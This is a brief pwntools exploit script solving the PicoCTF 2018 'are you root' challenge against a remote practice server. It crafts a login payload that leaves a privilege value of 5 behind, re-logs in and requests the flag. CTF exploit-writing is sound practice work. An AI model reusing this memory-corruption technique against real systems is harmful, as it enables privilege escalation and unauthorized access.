from pwn import *

#context.log_level = 'debug'

#p = process('./PicoCTF_2018_are_you_root')
p = remote('node4.buuoj.cn', 26844)

payload = b'login ' + b'a' * 0x8 + p64(5)

p.sendlineafter(b'command:\n', payload)

p.sendlineafter(b'command:\n', b'reset')

p.sendlineafter(b'command:\n', b'login s')

# gdb.attach(p, '''
#     source ~/libc/loadsym.py
#     loadsym ~/libc/2.27/64/libc-2.27.debug.so
# ''')

p.sendlineafter(b'command:\n', b'get-flag')

p.recv()
print(p.recv())